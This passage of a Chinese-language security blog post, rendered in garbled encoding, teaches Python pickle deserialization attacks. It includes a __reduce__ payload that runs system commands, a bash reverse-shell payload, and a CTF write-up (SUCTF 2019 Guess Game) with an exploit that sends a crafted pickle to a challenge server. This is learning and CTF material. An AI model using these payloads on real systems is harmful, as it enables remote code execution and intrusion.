ˆé¡¶å¼¹å‡ºä¸€ä¸ªå¯æ‰§è¡Œå¯¹è±¡å’Œä¸€ä¸ªå…ƒç»„ï¼Œå…ƒç»„ä½œä¸ºå‡½æ•°çš„å‚æ•°åˆ—è¡¨æ‰§è¡Œï¼Œå¹¶å°†è¿”å›å€¼å‹å…¥æ ˆä¸Š</li><li>. ï¼šç‚¹å·æ˜¯ç»“æŸç¬¦</li><li>}ï¼špushä¸€ä¸ªç©ºçš„å­—å…¸</li></ul><p><strong>ååºåˆ—åŒ–è¿‡ç¨‹ï¼š</strong><a href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf">https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf</a></p><p><strong>æ‰‹å†™æŒ‡ä»¤ç ï¼š</strong></p><p>åŸºæœ¬æ¨¡å¼ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c&lt;module&gt;</span><br><span class="line">&lt;callable&gt;</span><br><span class="line">(&lt;args&gt;</span><br><span class="line">tR</span><br></pre></td></tr></table></figure><p>çœ‹ä¸ªå°ä¾‹å­ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">cos</span><br><span class="line">system</span><br><span class="line">(S<span class="string">&#x27;ls&#x27;</span></span><br><span class="line">tR.</span><br><span class="line"></span><br><span class="line">&lt;=&gt; __import__(&#x27;os&#x27;).system(*(&#x27;ls&#x27;,))</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ†è§£ä¸€ä¸‹ï¼š</span></span><br><span class="line">cos</span><br><span class="line">system  =&gt;  å¼•å…¥ systemï¼Œå¹¶å°†å‡½æ•°æ·»åŠ åˆ° stack</span><br><span class="line"></span><br><span class="line">(S&#x27;ls&#x27;  =&gt;  æŠŠå½“å‰ stack å­˜åˆ° metastackï¼Œæ¸…ç©º stackï¼Œå†å°† &#x27;ls&#x27; å‹å…¥ stack</span><br><span class="line">t       =&gt;  stack ä¸­çš„å€¼å¼¹å‡ºå¹¶è½¬ä¸º tupleï¼ŒæŠŠ metastack è¿˜åŸåˆ° stackï¼Œå†å°† tuple å‹å…¥ stack</span><br><span class="line"><span class="comment"># ç®€å•æ¥è¯´ï¼Œ(,t ä¹‹é—´çš„å†…å®¹å½¢æˆäº†ä¸€ä¸ª tupleï¼Œstack ç›®å‰æ˜¯ [&lt;built-in function system&gt;, (&#x27;ls&#x27;,)]</span></span><br><span class="line">R       =&gt;  system(*(&#x27;ls&#x27;,))</span><br><span class="line">.       =&gt;  ç»“æŸï¼Œè¿”å›å½“å‰æ ˆé¡¶å…ƒç´ </span><br></pre></td></tr></table></figure><h2 id="reduce-æ–¹æ³•"><a href="#reduce-æ–¹æ³•" class="headerlink" title="__reduce__æ–¹æ³•"></a><code>__reduce__</code>æ–¹æ³•</h2><p>è¯¥æ–¹æ³•åœ¨ååºåˆ—åŒ–æ—¶è‡ªåŠ¨è°ƒç”¨</p><ul><li>å¦‚æœè¿”å›å€¼æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆå°†ä¼šå»å½“å‰ä½œç”¨åŸŸä¸­æŸ¥æ‰¾å­—ç¬¦ä¸²å€¼å¯¹åº”åå­—çš„å¯¹è±¡ï¼Œå°†å…¶åºåˆ—åŒ–ä¹‹åè¿”å›ï¼Œä¾‹å¦‚æœ€å<code>return &#39;a&#39;</code>,é‚£ä¹ˆå®ƒå°±ä¼šåœ¨å½“å‰çš„ä½œç”¨åŸŸä¸­å¯»æ‰¾åä¸º<code>a</code>çš„å¯¹è±¡ç„¶åè¿”å›ï¼Œå¦åˆ™æŠ¥é”™ã€‚</li><li>å¦‚æœè¿”å›å€¼æ˜¯ä¸€ä¸ªå…ƒç»„ï¼Œè¦æ±‚æ˜¯2åˆ°5ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å¯è°ƒç”¨çš„å¯¹è±¡ï¼Œç¬¬äºŒä¸ªæ˜¯è¯¥å¯¹è±¡æ‰€éœ€çš„å‚æ•°å…ƒç»„ï¼Œå‰©ä¸‹ä¸‰ä¸ªå¯é€‰ã€‚æ‰€ä»¥æ¯”å¦‚æœ€å<code>return (eval,(&quot;os.system(&#39;ls&#39;)&quot;,))</code>ï¼Œé‚£ä¹ˆå°±æ˜¯æ‰§è¡Œevalå‡½æ•°ï¼Œç„¶åå…ƒç»„å†…çš„å€¼ä½œä¸ºå‚æ•°ï¼Œä»è€Œè¾¾åˆ°æ‰§è¡Œå‘½ä»¤æˆ–ä»£ç çš„ç›®çš„ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥<code>return (os.system,(&#39;ls&#39;,))</code>ã€‚</li></ul><p>ç”±æ­¤æˆ‘ä»¬å¯ä»¥æ„é€ å¦‚ä¸‹çš„exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">&#x27;whoami&#x27;</span>,))</span><br><span class="line"></span><br><span class="line">a=test()</span><br><span class="line">c=pickle.dumps(a)</span><br><span class="line">print(c)</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬æ— éœ€å¯¼å…¥osæ¨¡å—ï¼Œæ— éœ€æœ‰testç±»ï¼Œå°±èƒ½ä»£ç æ‰§è¡Œ</p><img src="/2020/04/10/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/TIMæˆªå›¾20200409210943.png" style="zoom:80%;"><p>åŒæ ·ï¼Œå¼¹shellä¹‹ç±»çš„ä¹Ÿä¸åœ¨è¯ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        code=<span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/127.0.0.1/12345 0&lt;&amp;1 2&gt;&amp;1&quot;&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(code,))</span><br><span class="line">a=test()</span><br><span class="line">c=pickle.dumps(a)</span><br><span class="line">print(c)</span><br><span class="line">pickle.loads(c)</span><br></pre></td></tr></table></figure><p><code>__reduce__</code>æ–¹æ³•æ˜¯æ–°å¼ç±»(å†…ç½®ç±»)ç‰¹æœ‰çš„ï¼Œåœ¨python2ä¸­è¦æ³¨æ„ç»§æ‰¿objectç±»</p><h2 id="çœŸå®æ¡ˆä¾‹"><a href="#çœŸå®æ¡ˆä¾‹" class="headerlink" title="çœŸå®æ¡ˆä¾‹"></a>çœŸå®æ¡ˆä¾‹</h2><p>Pç¥çš„æ“ä½œï¼š<a href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html">https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html</a></p><p>Redisæœªæˆæƒè®¿é—®+Pythonååºåˆ—åŒ–</p><h2 id="CTFé¢˜ç›®"><a href="#CTFé¢˜ç›®" class="headerlink" title="CTFé¢˜ç›®"></a>CTFé¢˜ç›®</h2><h3 id="SUCTF-2019-Guess-Game"><a href="#SUCTF-2019-Guess-Game" class="headerlink" title="[SUCTF 2019]Guess Game"></a>[SUCTF 2019]Guess Game</h3><p>é¢˜ç›®åœ°å€ï¼š<a href="https://github.com/team-su/SUCTF-2019/tree/master/Misc/guess_game">https://github.com/team-su/SUCTF-2019/tree/master/Misc/guess_game</a></p><p>buuä¸Šæœ‰ç¯å¢ƒï¼Œåˆ—ä¸‹å…³é”®çš„æºç ï¼š</p><p><strong>game_client.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> guess_game.Ticket <span class="keyword">import</span> Ticket</span><br><span class="line"><span class="keyword">from</span> guess_game <span class="keyword">import</span> banner</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack_length</span>(<span class="params">obj</span>):</span></span><br><span class="line">    <span class="keyword">return</span> pack(<span class="string">&#x27;&gt;I&#x27;</span>, obj)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">start_client</span>(<span class="params">host, port</span>):</span></span><br><span class="line">    reader, writer = <span class="keyword">await</span> asyncio.open_connection(host, port)</span><br><span class="line">    print(banner)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        number = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> number == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                number = input(<span class="string">&#x27;Input the number you guess\n&gt; &#x27;</span>)</span><br><span class="line">                number = int(number)</span><br><span class="line">            <span class="keyword">except</span> ValueError:</span><br><span class="line">                number = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        ticket = Ticket(number)</span><br><span class="line">        ticket = pickle.dumps(ticket)</span><br><span class="line">        writer.write(pack_length(len(ticket)))</span><br><span class="line">        writer.write(ticket)</span><br><span class="line">        response = <span class="keyword">await</span> reader.readline()</span><br><span class="line">        print(response.decode())</span><br><span class="line">    response = <span class="keyword">await</span> reader.readline()</span><br><span class="line">    print(response.decode())</span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(start_client(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">27628</span>))</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„ä»£ç çš„æ„æ€å°±æ˜¯è¿›è¡Œ10æ¬¡çŒœæ•°ï¼Œåºåˆ—åŒ–å¹¶ç¼–ç ä¼ è¾“åˆ°æœåŠ¡ç«¯</p><p><strong>game_server.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> guess_game.Ticket <span class="keyword">import</span> Ticket</span><br><span class="line"><span class="keyword">from</span> guess_game.RestrictedUnpickler <span class="keyword">import</span> restricted_loads</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> unpack</span><br><span class="line"><span class="keyword">from</span> guess_game <span class="keyword">import</span> game</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span>():</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">&#x27;/flag&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        flag = f.read().strip()</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_length</span>(<span class="params">obj</span>):</span></span><br><span class="line">    <span class="keyword">return</span> unpack(<span class="string">&#x27;&gt;I&#x27;</span>, obj)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stdin_read</span>(<span class="params">length</span>):</span></span><br><span class="line">    <span class="keyword">return</span> sys.stdin.buffer.read(length)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> game.finished():</span><br><span class="line">        length = stdin_read(<span class="number">4</span>)</span><br><span class="line">        length, = read_length(length)</span><br><span class="line">        ticket = stdin_read(length)</span><br><span class="line">        ticket = restricted_loads(ticket) <span class="comment"># è°ƒç”¨RestrictedUnpickler.restricted_loads()æ–¹æ³•</span></span><br><span class="line">        <span class="keyword">assert</span> type(ticket) == Ticket</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> ticket.is_valid():</span><br><span class="line">            print(<span class="string">&#x27;The number is invalid.&#x27;</span>)</span><br><span class="line">            game.next_game(Ticket(<span class="number">-1</span>))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        win = game.next_game(ticket)</span><br><span class="line">        <span class="keyword">if</span> win:</span><br><span class="line">            text = <span class="string">&quot;Congratulations, you get the right number!&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            text = <span class="string">&quot;Wrong number, better luck next time.&quot;</span></span><br><span class="line">        print(text)</span><br><span class="line">    <span class="keyword">if</span> game.is_win():</span><br><span class="line">        text = <span class="string">&quot;Game over! You win all the rounds, here is your flag %s&quot;</span> % get_flag()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        text = <span class="string">&quot;Game over! You got %d/%d.&quot;</span> % (game.win_count, game.round_count)</span><br><span class="line">    print(text)</span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line">    print(<span class="string">&#x27;Houston, we got a problem.&#x27;</span>)</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç æ˜¯æœåŠ¡ç«¯çš„ï¼Œæ¥æ”¶ä¼ è¿‡æ¥çš„æ•°æ®å¹¶ååºåˆ—åŒ–ï¼Œåˆ¤æ–­ååºåˆ—åŒ–çš„ç»“æœæ˜¯ä¸æ˜¯Ticketç±»ï¼Œæ˜¯çš„è¯æ‰ä¼šæ¥ç€æ‰§è¡Œï¼Œgame.is_win()æˆç«‹æ‰ä¼šç»™flag</p><p><strong>RestrictedUnpickler.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span>(<span class="params">pickle.Unpickler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span>(<span class="params">self, module, name</span>):</span></span><br><span class="line">        <span class="comment"># Only allow safe classes</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;guess_game&quot;</span> == module[<span class="number">0</span>:<span class="number">10</span>] <span class="keyword">and</span> <span class="string">&quot;__&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">return</span> getattr(sys.modules[module], name)</span><br><span class="line">        <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">restricted_loads</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç çš„ä»‹ç»å‚è€ƒï¼š<a href="https://docs.python.org/zh-cn/3/library/pickle.html?highlight=__reduce#restricting-globals">https://docs.python.org/zh-cn/3/library/pickle.html?highlight=__reduce#restricting-globals</a></p><p>å¤§æ¦‚æ„æ€å°±æ˜¯ï¼Œä¸ºäº†é˜²æ­¢pickleååºåˆ—åŒ–çš„å±å®³ï¼Œå¯ä»¥ç»§æ‰¿pickle.Unpicklerå®ç°find_classæ–¹æ³•ä»è€Œè¾¾åˆ°è¿‡æ»¤éƒ¨åˆ†æ¨¡å—æ–¹æ³•çš„ç›®çš„ï¼Œè¯¥æ–¹æ³•åœ¨ä½¿ç”¨è¯¥ç±»æ—¶è‡ªåŠ¨è°ƒç”¨ã€‚</p><p>è€Œåœ¨è¯¥é¢˜ä¸­ï¼Œå¿…é¡»æœ‰guess_gameé‡Œçš„ç±»ï¼Œè€Œä¸”è¿‡æ»¤äº†<code>__</code>ï¼Œ<code>__reduce__</code>é‚£ç§æ–¹æ³•æ˜¾ç„¶ä¸èƒ½ç”¨äº†</p><p>çœ‹ä¸‹Game.pyï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> guess_game.Ticket <span class="keyword">import</span> Ticket</span><br><span class="line"><span class="keyword">from</span> guess_game <span class="keyword">import</span> max_round, number_range</span><br><span class="line"><span class="comment"># max_roundä»£è¡¨å›åˆ number_rangeä»£è¡¨æœ€å¤§æ•°</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        number = randint(<span class="number">0</span>, number_range)</span><br><span class="line">        self.curr_ticket = Ticket(number)</span><br><span class="line">        self.round_count = <span class="number">0</span></span><br><span class="line">        self.win_count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next_game</span>(<span class="params">self, ticket</span>):</span></span><br><span class="line">        win = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> self.curr_ticket == ticket:</span><br><span class="line">            self.win_count += <span class="number">1</span></span><br><span class="line">            win = <span class="literal">True</span></span><br><span class="line">        number = randint(<span class="number">0</span>, number_range)</span><br><span class="line">        self.curr_ticket = Ticket(number)</span><br><span class="line">        self.round_count += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> win</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">finished</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.round_count &gt;= max_round</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_win</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.win_count == max_round</span><br></pre></td></tr></table></figure><p>åœ¨<code>__init__.py</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">max_round = <span class="number">10</span></span><br><span class="line">number_range = <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> guess_game.Game <span class="keyword">import</span> Game</span><br><span class="line"></span><br><span class="line">game = Game()</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè™½ç„¶æ¡ä»¶å—é™, åªèƒ½åŠ è½½æŒ‡å®šæ¨¡å—, ä½†æ˜¯å¯ä»¥çœ‹åˆ° <code>__init.py__</code> ä¸­ <code>game = Game()</code>, æ‰€ä»¥åªè¦æ„é€ å‡º pickle ä»£ç è·å¾— guess_game.gameå¯¹è±¡, ç„¶åä¿®æ”¹ game çš„ win_count å’Œ round_count å³å¯.<br>æ³¨æ„è¿™é‡Œå¿…é¡»æ‰‹å†™, å¦‚æœæ˜¯ <code>from guess_game import game</code>, ç„¶åä¿®æ”¹å† dumps è¿™ä¸ª game çš„è¯, æ˜¯åœ¨è¿è¡Œæ—¶é‡æ–°æ–°å»ºä¸€ä¸ª Game å¯¹è±¡, è€Œä¸æ˜¯ä» guess_game è¿™ä¸ª module é‡Œé¢è·å–ã€‚</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">s = socket.socket()</span><br><span class="line">s.connect((<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">29935</span>))</span><br><span class="line">exp = <span class="string">b&#x27;&#x27;&#x27;cguess_game</span></span><br><span class="line"><span class="string">game</span></span><br><span class="line"><span class="string">&#125;S&quot;win_count&quot;</span></span><br><span class="line"><span class="string">I10</span></span><br><span class="line"><span class="string">sS&quot;round_count&quot;</span></span><br><span class="line"><span class="string">I10</span></span><br><span class="line"><span class="string">sbcguess_game.Ticket\nTicket\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00numberq\x03K\x03sb.&#x27;&#x27;&#x27;</span></span><br><span class="line">s.send(struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, len(exp)))</span><br><span class="line">s.send(exp)</span><br><span class="line">print(s.recv(<span class="number">1024</span>))</span><br><span class="line">print(s.recv(<span class="number">1024</span>))</span><br><span class="line">print(s.recv(<span class="number">1024</span>))</span><br><span class="line">print(s.recv(<span class="number">1024</span>))</span><br></pre></td></tr></table></figure><p>åˆ†æä¸€ä¸‹æ„é€ è¿‡ç¨‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cguess_game</span><br><span class="line">game<span class="comment"># å¼•å…¥guess_game.gameç±»</span></span><br><span class="line">&#125;S<span class="string">&#x27;round_count&#x27;</span><span class="comment"># pushä¸€ä¸ªç©ºçš„å­—å…¸ï¼ŒæŠŠround_countå’Œwin_countåŠ åˆ°é‡Œé¢</span></span><br><span class="line">I10</span><br><span class="line">sS<span class="string">&#x27;win_count&#x27;</span></span><br><span class="line">I10</span><br><span class="line">sbcguess_game.Ticket\nTicket\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00numberq\x03K\xffsb.</span><br></pre></td></tr></table></figure><p>æœ€åä¸€è¡Œå‰ä¸¤ä¸ªå­—æ¯è¡¨ç¤ºå¯¹è±¡æ›´æ–°ï¼Œåé¢ä¸€ä¸²æ˜¯guess_game.Ticketå¯¹è±¡åºåˆ—åŒ–çš„ç»“æœï¼Œ<code>pickle</code> åºåˆ—æµæ‰§è¡Œå®Œåä¼šæŠŠæ ˆé¡¶çš„å€¼è¿”å›ï¼Œé‚£ç»“å°¾å†ç•™ä¸€ä¸ª <code>Ticket</code> çš„å¯¹è±¡å°±è¡Œäº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> guess_game.Ticket <span class="keyword">import</span> Ticket</span><br><span class="line"><span class="keyword">from</span> guess_game.Game <span class="keyword">import</span> Game</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">exp = <span class="string">b&#x27;&#x27;&#x27;cguess_game</span></span><br><span class="line"><span class="string">game</span></span><br><span class="line"><span class="string">&#125;S&quot;win_count&quot;</span></span><br><span class="line"><span class="string">I10</span></span><br><span class="line"><span class="string">sS&quot;round_count&quot;</span></span><br><span class="line"><span class="string">I10</span></span><br><span class="line"><span class="string">sb\x80\x03cguess_game.Ticket\nTicket\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00numberq\x03K\x03sb.&#x27;&#x27;&#x27;</span></span><br><span class="line">exp1 = <span class="string">b&#x27;&#x27;&#x27;cguess_game</span></span><br><span class="line"><span class="string">game</span></span><br><span class="line"><span class="string">&#125;S&quot;win_count&quot;</span></span><br><span class="line"><span class="string">I10</span></span><br><span class="line"><span class="string">sS&quot;round_count&quot;</span></span><br><span class="line"><span class="string">I10</span></span><br><span class="line"><span class="string">sb.&#x27;&#x27;&#x27;</span></span><br><span class="line">a=Ticket(<span class="number">3</span>)</span><br><span class="line">print(pickle.dumps(a))</span><br><span class="line"><span class="comment"># b&#x27;\x80\x03cguess_game.Ticket\nTicket\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00numberq\x03K\x03sb.&#x27;</span></span><br><span class="line">b=pickle.loads(exp)</span><br><span class="line">print(b)</span><br><span class="line"><span class="comment"># &lt;guess_game.Ticket.Ticket object at 0x7f9370b61a90&gt;</span></span><br><span class="line">print(b.__dict__)</span><br><span class="line"><span class="comment"># &#123;&#x27;number&#x27;: 3&#125;</span></span><br><span class="line">c=pickle.loads(exp1)</span><br><span class="line">print(c)</span><br><span class="line"><span class="comment"># &lt;guess_game.Game.Game object at 0x7f9370b50eb8&gt;</span></span><br><span class="line">print(c.__dict__)</span><br><span class="line"><span class="comment"># &#123;&#x27;win_count&#x27;: 10, &#x27;curr_ticket&#x27;: &lt;guess_game.Ticket.Ticket object at 0x7f9370b50f60&gt;, &#x27;round_count&#x27;: 10&#125;</span></span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š</p><p><a href="https://www.xjimmy.com/python-36-serialization.html">https://www.xjimmy.com/python-36-serialization.html</a></p><p><a href="https://zhuanlan.zhihu.com/p/89132768">https://zhuanlan.zhihu.com/p/89132768</a></p><p><a 